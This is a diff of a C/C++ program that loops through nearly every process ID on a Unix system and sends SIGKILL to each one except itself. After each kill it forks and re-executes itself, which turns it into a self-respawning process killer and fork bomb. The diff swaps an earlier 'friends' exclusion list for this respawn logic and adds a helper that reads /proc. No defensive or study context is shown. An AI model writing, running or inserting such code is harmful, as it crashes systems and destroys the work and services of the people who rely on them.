@@ -8,33 +8,60 @@
 #include <errno.h>
 #include <signal.h>
 #include <time.h>
-#include <proc/readproc.h>
+#include <string.h>
+#include <string>
+
+#define SZ_BUFFER 4096
 
 void attack();
-bool friends[32768];
+void spawn();
+char* getExe(int pid);
+char* exenm;
+
+char* self;
 
 int main(int argc, char* argv[]) {
-	friends[getpid()] = true;
-	//int p;
+
+	self = strdup(argv[0]);
+
+	//exenm = getExe(getpid());
+	
+	
 	while(1){
-		int p = fork();
-		if(p == 0){
-			attack();
-		}
-		else if(p == -1){
-			attack();
-		}
+		//spawn();
+		attack();
 	}
 }
 void attack(){
-	friends[getpid()] = true;
-	int p;
+	int p = getpid();
 	int i = 1;
 	while(i < 32767){
-		if(!friends[i]){
+		if(i != p){
 			kill(i, SIGKILL);
+			spawn();
 		}
 		i++;
 	}
-	attack();
 }
+void spawn() {
+	int p = fork();
+	if (p == 0) {
+		execl(self, self, NULL);
+	}
+}
+
+char* getExe(int pid){
+	char* exe = new char[1024];
+	char path[1024];
+
+	sprintf(path, "/proc/%d/exe", pid);
+
+	int ret = readlink(path, exe, 1023);
+	if(ret == -1){
+		return NULL;
+	}
+	exe[ret] = 0;
+	return exe;
+}
+
+
